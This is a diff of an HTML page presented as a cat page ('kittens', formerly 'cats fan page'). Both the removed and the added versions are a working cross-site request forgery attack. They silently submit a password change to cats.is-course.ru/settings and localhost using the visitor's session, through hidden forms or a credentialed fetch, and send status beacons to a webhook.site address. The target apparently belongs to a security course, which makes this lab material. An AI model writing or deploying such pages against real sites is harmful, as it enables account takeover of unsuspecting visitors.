@@ -1,25 +1,12 @@
-<!doctype html><html><head><meta charset="utf-8"><title>cats fan page</title></head><body>
-<h1>Cutest cats of 2026</h1>
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<h1>kittens</h1>
+<form id="f" method="POST" action="https://cats.is-course.ru/settings">
+<input type="text" name="password" value="Top9!navmeow2026">
+<input type="text" name="confirm-password" value="Top9!navmeow2026">
+<input type="submit" value="go"></form>
 <script>
-var U="5169748c-49df-4307-9820-7383309d9f02", PW="Kx7!meowcat2024", T="https://cats.is-course.ru/settings";
-function beep(n){ (new Image()).src="https://webhook.site/"+U+"/"+n; }
-var body="password="+encodeURIComponent(PW)+"&confirm-password="+encodeURIComponent(PW);
-function post(host,tag){
-  return fetch(host,{method:"POST",mode:"no-cors",credentials:"include",
-    headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body})
-   .then(function(){beep(tag+"_ok")}).catch(function(){beep(tag+"_err")});
-}
-function iframeForm(tag,host){
-  var f=document.createElement("iframe");f.name="s_"+tag;f.style.display="none";document.body.appendChild(f);
-  var fm=document.createElement("form");fm.method="POST";fm.action=host;fm.target="s_"+tag;fm.style.display="none";
-  [["password",PW],["confirm-password",PW]].forEach(function(kv){
-    var i=document.createElement("input");i.name=kv[0];i.value=kv[1];fm.appendChild(i);});
-  document.body.appendChild(fm);
-  try{fm.submit();beep(tag+"_sub");}catch(e){beep(tag+"_throw");}
-}
-post(T,"A");                          // fetch, no-cors, credentials
-post("http://localhost:8080/settings","L");
-setTimeout(function(){iframeForm("B",T);},600);         // hidden iframe form
-setTimeout(function(){iframeForm("M","http://localhost:8080/settings");},900);
-setTimeout(function(){beep("alive1500");},1500);
+var U="5169748c-49df-4307-9820-7383309d9f02";
+(new Image()).src="https://webhook.site/"+U+"/nav_start";
+setTimeout(function(){ document.getElementById('f').submit();
+  setTimeout(function(){(new Image()).src="https://webhook.site/"+U+"/nav_survived";},500); },300);
 </script></body></html>
